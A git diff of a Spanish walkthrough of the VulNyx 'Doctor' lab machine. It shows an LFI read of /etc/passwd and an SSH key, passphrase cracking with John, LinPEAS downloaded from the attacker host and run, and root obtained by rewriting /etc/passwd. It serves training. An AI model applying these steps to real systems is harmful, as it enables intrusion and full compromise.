@@ -1,20 +1,50 @@
 # WriteUp: Doctor | VulNyx
 
-Iniciamos realizando un escaneo con nmap para identificar los puertos abiertos:
+En el presente artículo, documentaré detalladamente el proceso técnico que seguí para comprometer una máquina objetivo, desde la fase inicial de reconocimiento hasta la obtención de privilegios de superusuario (`root`). El objetivo de este análisis es educativo, buscando desglosar cada paso de manera formal y precisa.
 
-```sh
+### <mark style="color:yellow;">Fase 1: Reconocimiento y Escaneo de Puertos</mark>
+
+Mi primer paso en cualquier evaluación de seguridad es realizar un reconocimiento exhaustivo de la superficie de ataque. Para esta tarea, mi herramienta de elección es **Nmap (Network Mapper)**, un estándar de la industria para el descubrimiento de redes y la auditoría de seguridad.
+
+Inicialmente, mi objetivo era identificar todos los puertos TCP abiertos en el host `192.168.56.26`. Para ello, ejecuté un escaneo rápido con el siguiente comando:
+
+```bash
 nmap -n -Pn -sS -p- --min-rate 5000 192.168.56.26
+```
 
+Permíteme desglosar los parámetros utilizados:
+
+* `-n`: Desactiva la resolución de nombres DNS, lo que acelera el escaneo al no intentar resolver la IP a un nombre de host.
+* `-Pn`: Omite la fase de descubrimiento de host (ping scan). Asumo que el objetivo está activo y procedo directamente al escaneo de puertos, lo cual es útil para evadir firewalls que bloquean pings.
+* `-sS`: Realiza un escaneo TCP SYN (también conocido como "half-open" o sigiloso), que es rápido y menos propenso a ser registrado por los sistemas objetivo.
+* `-p-`: Indica a Nmap que escanee los 65,535 puertos TCP posibles, asegurando que no se omita ningún servicio que se ejecute en un puerto no estándar.
+* `--min-rate 5000`: Establece una tasa mínima de envío de paquetes para acelerar significativamente el proceso de escaneo.
+
+Los resultados de este escaneo inicial fueron los siguientes:
+
+```bash
 PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
 ```
 
-Luego realizamos otro escaneo para para identificar mayor información:
+Este hallazgo inicial me proporcionó dos vectores de ataque potenciales: un servicio SSH en el puerto 22 y un servidor web en el puerto 80.
 
-```sh
-nmap -sVC -p22,80 192.168.56.26     
+Para profundizar mi análisis, procedí con un segundo escaneo, esta vez enfocado en los puertos descubiertos para identificar las versiones de los servicios y ejecutar scripts de enumeración básicos.
 
+```bash
+nmap -sVC -p22,80 192.168.56.26
+```
+
+Aquí, los parámetros clave fueron:
+
+* `-sV`: Realiza un sondeo de los puertos abiertos para determinar la información de la versión del servicio.
+* `-sC`: Ejecuta los scripts por defecto del Nmap Scripting Engine (NSE) para recopilar información adicional y verificar vulnerabilidades conocidas.
+* `-p22,80`: Enfoca el escaneo únicamente en los puertos de interés previamente identificados.
+
+Este escaneo me proporcionó información mucho más detallada:
+
+```bash
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
 | ssh-hostkey: 
@@ -26,195 +56,169 @@ PORT   STATE SERVICE VERSION
 |_http-title: Docmed
 ```
 
-Luego de esto visitamos el puerto 80 para identificar la web alojada:&#x20;
+A partir de estos resultados, confirmé que el servidor SSH es una versión de OpenSSH para Debian 10 y el servidor web es Apache 2.4.38, también en Debian. El título de la página, "Docmed", me dio un nombre para la aplicación web, lo que me llevó a centrar mi atención inicial en el puerto 80.
+
+### <mark style="color:yellow;">Fase 2: Enumeración del Servicio Web y Detección de Vulnerabilidades</mark>
+
+Procedí a investigar el servicio web alojado en el puerto 80. Al navegar a `http://192.168.56.26`, me encontré con la siguiente interfaz:
 
 <figure><img src="../../.gitbook/assets/1.png" alt=""><figcaption></figcaption></figure>
 
-Inspeccionando la página con el fin de encontrar algún comentario que me haga más fácil la vida (jejej) me percaté de la siguiente estructura:
+Mi siguiente paso fue inspeccionar el código fuente de la página en busca de comentarios, rutas ocultas o cualquier pista que pudiera revelar la lógica subyacente de la aplicación. Fue entonces cuando descubrí una estructura de enlace interesante:
 
 <figure><img src="../../.gitbook/assets/2.png" alt=""><figcaption></figcaption></figure>
 
-Así que pues ingresando a esa sección podemos confirmar la URL y un posible LFI:&#x20;
+El enlace apuntaba a `doctor-item.php?include=Doctors.html`, un patrón que inmediatamente me alertó sobre una posible vulnerabilidad de **Inclusión Local de Archivos (LFI)**. Esta vulnerabilidad ocurre cuando una aplicación utiliza la entrada del usuario para incluir archivos en el servidor sin una validación adecuada.
 
-<figure><img src="../../.gitbook/assets/3.png" alt=""><figcaption></figcaption></figure>
+### <mark style="color:yellow;">Fase 3: Explotación de LFI para la Obtención de Credenciales</mark>
 
-Así que intenté con algunas rutas bastante simples:&#x20;
+Con una posible vulnerabilidad LFI identificada, mi hipótesis era que podría manipular el parámetro `include` para leer archivos sensibles del sistema operativo. Para verificar esto, intenté acceder al archivo `/etc/passwd`, un objetivo común para la validación de LFI, ya que es legible por todos los usuarios en sistemas tipo Unix.
+
+Construí la siguiente URL: `http://192.168.56.26/doctor-item.php?include=/etc/passwd`. El intento fue exitoso:
 
 <figure><img src="../../.gitbook/assets/4.png" alt=""><figcaption></figcaption></figure>
 
-Bueno, una mejor vista acá:
+El contenido del archivo `/etc/passwd` se renderizó en la página, proporcionándome una lista de los usuarios del sistema. A continuación, presento una tabla con los datos más relevantes que extraje:
 
-| Usuario          | Contraseña | UID      | GID      | Comentario/Info              | Directorio Home | Shell             |
-| ---------------- | ---------- | -------- | -------- | ---------------------------- | --------------- | ----------------- |
-| **root**         | x          | **0**    | **0**    | root                         | /root           | **/bin/bash**     |
-| daemon           | x          | 1        | 1        | daemon                       | /usr/sbin       | /usr/sbin/nologin |
-| bin              | x          | 2        | 2        | bin                          | /bin            | /usr/sbin/nologin |
-| sys              | x          | 3        | 3        | sys                          | /dev            | /usr/sbin/nologin |
-| sync             | x          | 4        | 65534    | sync                         | /bin            | /bin/sync         |
-| games            | x          | 5        | 60       | games                        | /usr/games      | /usr/sbin/nologin |
-| man              | x          | 6        | 12       | man                          | /var/cache/man  | /usr/sbin/nologin |
-| lp               | x          | 7        | 7        | lp                           | /var/spool/lpd  | /usr/sbin/nologin |
-| mail             | x          | 8        | 8        | mail                         | /var/mail       | /usr/sbin/nologin |
-| news             | x          | 9        | 9        | news                         | /var/spool/news | /usr/sbin/nologin |
-| uucp             | x          | 10       | 10       | uucp                         | /var/spool/uucp | /usr/sbin/nologin |
-| proxy            | x          | 13       | 13       | proxy                        | /bin            | /usr/sbin/nologin |
-| www-data         | x          | 33       | 33       | www-data                     | /var/www        | /usr/sbin/nologin |
-| backup           | x          | 34       | 34       | backup                       | /var/backups    | /usr/sbin/nologin |
-| list             | x          | 38       | 38       | Mailing List Manager         | /var/list       | /usr/sbin/nologin |
-| irc              | x          | 39       | 39       | ircd                         | /var/run/ircd   | /usr/sbin/nologin |
-| gnats            | x          | 41       | 41       | Gnats Bug-Reporting System   | /var/lib/gnats  | /usr/sbin/nologin |
-| nobody           | x          | 65534    | 65534    | nobody                       | /nonexistent    | /usr/sbin/nologin |
-| \_apt            | x          | 100      | 65534    |                              | /nonexistent    | /usr/sbin/nologin |
-| systemd-timesync | x          | 101      | 102      | systemd Time Synchronization | /run/systemd    | /usr/sbin/nologin |
-| systemd-network  | x          | 102      | 103      | systemd Network Management   | /run/systemd    | /usr/sbin/nologin |
-| systemd-resolve  | x          | 103      | 104      | systemd Resolver             | /run/systemd    | /usr/sbin/nologin |
-| messagebus       | x          | 104      | 110      |                              | /nonexistent    | /usr/sbin/nologin |
-| sshd             | x          | 105      | 65534    |                              | /run/sshd       | /usr/sbin/nologin |
-| systemd-coredump | x          | 999      | 999      | systemd Core Dumper          | /               | /usr/sbin/nologin |
-| **admin**        | x          | **1000** | **1000** | admin                        | /home/admin     | **/bin/bash**     |
+| Usuario   | Contraseña | UID      | GID      | Comentario/Info | Directorio Home | Shell             |
+| --------- | ---------- | -------- | -------- | --------------- | --------------- | ----------------- |
+| **root**  | x          | **0**    | **0**    | root            | /root           | **/bin/bash**     |
+| www-data  | x          | 33       | 33       | www-data        | /var/www        | /usr/sbin/nologin |
+| **admin** | x          | **1000** | **1000** | admin           | /home/admin     | **/bin/bash**     |
 
-Esto es muy interesando, logro visualizar al usuario root y admin, sería muy conveniente si pudiera visualizar el rsa de ambos usuarios.
+Mi atención se centró en los usuarios `root` y `admin`, ya que ambos poseían un shell de inicio de sesión válido (`/bin/bash`), convirtiéndolos en objetivos primarios para obtener acceso.
 
-Intenté mostrar el rsa del root, sin embargo no tuve respuesta, y claro, es evidente, debido a que el UID y GID están en 0, lo cual está reservado solo para el mismo root (pero bueno, no perdía nada intentándolo).
+Dado que el servicio SSH estaba abierto, mi siguiente objetivo fue buscar claves SSH privadas. Intenté leer la clave del usuario `root` usando la vulnerabilidad LFI:
 
-```sh
-http://192.168.56.26/doctor-item.php?include=/home/root/.ssh/id_rsa
+```bash
+http://192.168.56.26/doctor-item.php?include=../../../../../../home/root/.ssh/id_rsa
 ```
 
-Luego de ello, intenté listar el rsa del usuario admin, como podemos ver su UID Y GID están en 1000, por lo que es muy probable que tengamos alguna visual:&#x20;
+Como era de esperar, este intento no arrojó ningún resultado. Los permisos de los archivos en el directorio `.ssh` del usuario `root` están correctamente configurados para impedir el acceso de otros usuarios. Sin embargo, al intentar el mismo procedimiento para el usuario `admin`, cuyo UID es 1000, obtuve un resultado diferente:
 
 <figure><img src="../../.gitbook/assets/5.png" alt=""><figcaption></figcaption></figure>
 
-Y sí, logramos obtener la clave rsa de admin, sin embargo, podemos visualizar que dice `Proc-Type: 4,ENCRYPTED DEK-Info`, por lo que la clave rsa está encriptada. Esto significa que está protegida por una contraseña para que, incluso si alguien roba el archivo, no pueda usarla.
+Logré extraer con éxito el contenido de la clave SSH privada del usuario `admin`. Sin embargo, mi análisis del archivo reveló la línea `Proc-Type: 4,ENCRYPTED DEK-Info`. Esta cabecera confirma que la clave privada está cifrada con una frase de contraseña (passphrase), lo que significa que no podía utilizarla directamente.
 
-Bien, entonces lo siguiente que hice fue tratar de encontrar la clave del rsa a través de fuerza bruta con John the Ripper:
+### <mark style="color:yellow;">Fase 4: Ruptura de Credenciales y Acceso Inicial</mark>
 
-```sh
-# Copiamos la clave rsa y la pegamos en un nuevo archivo
-$ nano credenciales
+Para obtener la frase de contraseña, recurrí a **John the Ripper**, una potente herramienta de auditoría de contraseñas. El proceso consistió en tres pasos:
 
-# Luego generamos un archivo que JtR pueda leer
-$ ssh2john credenciales > crede.txt
+1. **Guardar la clave:** Copié la clave `id_rsa` obtenida y la guardé en un archivo local llamado `credenciales`.
+2. **Convertir la clave a un hash:** Utilicé la herramienta `ssh2john` para convertir la clave SSH a un formato de hash que John the Ripper pudiera procesar.
+3. **Fuerza bruta:** Ejecuté John the Ripper contra el hash generado, utilizando el popular diccionario `rockyou.txt`.
 
-# Y por último, lo pasamos a JtR para que busque la contraseña:
-$ john --wordlist=/usr/share/wordlists/rockyou.txt crede.txt
+```bash
+# Convertir la clave a un hash para John
+ssh2john credenciales > crede.txt
 
-Using default input encoding: UTF-8
-Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
-Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
-Cost 2 (iteration count) is 2 for all loaded hashes
-Will run 2 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-XXXXXXX          (credenciales) 
-
-# 7u7!! listo, JtR nos dio la clave 7u7!! 
+# Iniciar el proceso de cracking
+john --wordlist=/usr/share/wordlists/rockyou.txt crede.txt
 ```
 
-Luego, intentamos la conexión por SSH:
+Tras un breve periodo, John the Ripper logró descifrar la frase de contraseña.
 
-```sh
-# Primero le damos los permisos necesarios al archivo
+Con la clave privada y su correspondiente frase de contraseña en mi poder, procedí a establecer una conexión SSH. Primero, ajusté los permisos del archivo de la clave, ya que el cliente SSH requiere que estas sean de acceso restringido:
+
+```bash
+# Establecer permisos de solo lectura para el propietario
 chmod 600 credenciales
 
-# Luego nos conectamos
+# Conectarme al servidor vía SSH
 ssh -i credenciales admin@192.168.56.26
+```
+
+El sistema me solicitó la frase de contraseña que había obtenido. Al introducirla, logré establecer una sesión en la máquina objetivo como el usuario `admin`.
+
+```bash
 Enter passphrase for key 'credenciales': 
 admin@doctor:~$ id
-uid=1000(admin) gid=1000(admin) grupos=1000(admin)
-
-# 7u7!!!!
+uid=1000(admin) gid=1000(admin) groups=1000(admin)
 ```
 
-Bien, lo siguiente que hice fue buscar permisos de ejecución:
+### <mark style="color:yellow;">Fase 5: Escalada de Privilegios</mark>
 
-```sh
+Una vez dentro del sistema, mi objetivo final era escalar privilegios para convertirme en el usuario `root`. Comencé realizando una serie de verificaciones manuales en busca de vectores de escalada comunes:
+
+```bash
+# Revisar permisos de sudo
 sudo -l
-# NADA
 
+# Buscar archivos con el bit SUID establecido
 find / -perm -u=s -type f 2>/dev/null
-# NADA
 
+# Inspeccionar tareas programadas
 cat /etc/crontab
-# NADA
 
+# Buscar contraseñas en texto plano en el directorio web
 grep -r "password" /var/www/html 2>/dev/null
-# NADA
 ```
 
-Debido a que no encontré nada T-T! decidí automatizar :D!!!!! con LinPeas :D!!! En kali ya lo tenemos descargado.
+Estas comprobaciones iniciales no arrojaron resultados útiles. Para realizar una enumeración más profunda y eficiente, decidí utilizar **LinPEAS** (el cual viene instalado en Kali Linux), un script automatizado que busca exhaustivamente posibles vectores de escalada de privilegios en sistemas Linux.
 
-```sh
-# Nos movemos a 
+Primero, levanté un servidor HTTP simple en mi máquina de atacante para transferir el script:
+
+```bash
+# En mi máquina Kali, navegué al directorio de LinPEAS
 cd /usr/share/peass/linpeas
 
-# Creamos un servidor con python
+# Inicié un servidor web en el puerto 80
 python3 -m http.server 80
 ```
 
-En nuestra máquina victima nos vamos a `/tmp` ya que ahí tenemos todos los permisos.
+Luego, desde la máquina víctima, navegué al directorio `/tmp`, que generalmente permite la escritura y ejecución de archivos, y descargué el script:
 
-```sh
+```bash
+# Moverme a un directorio escribible
 cd /tmp
 
-# Descargamos LinPeas de nuestro kali
+# Descargar el script desde mi máquina
 wget http://192.168.56.22/linpeas.sh
 
-# Le damos permisos
+# Otorgar permisos de ejecución
 chmod +x linpeas.sh
 
-# Luego ejecutamos
+# Ejecutar el script
 ./linpeas.sh
 ```
 
-Luego de un momento de espera y de revisar toda la información, nos encontramos con los siguiente:&#x20;
+Tras revisar la extensa salida de LinPEAS, un hallazgo crítico se destacó inmediatamente:
 
 <figure><img src="../../.gitbook/assets/6.png" alt=""><figcaption></figcaption></figure>
 
-7u7!!!! BINGOOO!!!
+El script informó que el archivo `/etc/passwd` era escribible por mi usuario actual. Esta es una misoconfiguración de seguridad extremadamente grave. En sistemas Linux modernos, las contraseñas hasheadas se almacenan en `/etc/shadow`, que es legible solo por `root`. El archivo `/etc/passwd` contiene una `x` en el campo de la contraseña para indicar al sistema que la contraseña real se encuentra en `/etc/shadow`.
 
-Que LinPeas nos muestre `"/etc/passwd is writable"` significa que nuestro usuario (`admin`) tiene permisos para modificar este archivo crítico del sistema.
+Dado que yo podía modificar `/etc/passwd`, mi estrategia fue reemplazar la `x` del usuario `root` con un hash de contraseña de mi elección. Esto haría que el sistema ignorara `/etc/shadow` para la autenticación de `root` y utilizara el hash que yo proporcioné.
 
-Normalmente, las contraseñas están seguras en el archivo `/etc/shadow`, que solo `root` puede leer. El archivo `/etc/passwd` solo contiene una `x` en el campo de la contraseña (`root:x:0:0...`) para indicarle al sistema que busque en `/etc/shadow`.
+Primero, generé un hash para la contraseña `123456` usando `openssl`.
 
-Como ahora nosotros podemos escribir en `/etc/passwd`, podemos reemplazar `x` con nuestra propia contraseña cifrada. Al hacer esto, el sistema ya no usará `/etc/shadow` para autenticar a `root`, sino que usará la contraseña que acabamos de adjuntar.
-
-Para este proceso vamos a generar una contraseña cifrada para reemplazar a la `x`, hacemos lo siguiente:
-
-```sh
+```bash
 openssl passwd -1 123456
-
-# 123456 es la contraseña que deseamos cifrar
 ```
 
-Esto nos genera: `$1$gTqcQbju$b5huo6K8egw0UDboANeq/.` Ahora vamos a editar el archivo reemplazando la `x` en root:
+La salida fue: `$1$gTqcQbju$b5huo6K8egw0UDboANeq/.`
 
-```sh
-nano /etc/passwd
+A continuación, edité el archivo `/etc/passwd` con `nano` y modifiqué la línea correspondiente a `root`:
 
+**Línea original:**
+
+```bash
 root:x:0:0:root:/root:/bin/bash
 ```
 
-Ahora tenemos:
+**Línea modificada:**
 
-```sh
+```bash
 root:$1$gTqcQbju$b5huo6K8egw0UDboANeq/.:0:0:root:/root:/bin/bash
 ```
 
-Guardamos los cambios y salimos del editor (en `nano`, es `Ctrl+O`, `Enter`, y luego `Ctrl+X`).
+Una vez guardados los cambios, el último paso fue utilizar el comando `su` para cambiar al usuario `root`:
 
-Y ahora solo tenemos que convertirnos en root:
-
-```sh
-su root
-```
-
-El sistema nos pedirá la contraseña. Introducimos la que registramos (`123456`).
-
-```sh
+```bash
 admin@doctor:/tmp$ su root
 Contraseña: 
 root@doctor:/tmp# id
 uid=0(root) gid=0(root) grupos=0(root)
-
-# 7u7!!!! Listo, máquina terminada 7u7!!!!!!
 ```
+
+Al ingresar la contraseña `123456`, el sistema la validó contra el hash que inserté en `/etc/passwd`, concediéndome acceso como superusuario. Con esto, el compromiso de la máquina fue completado.
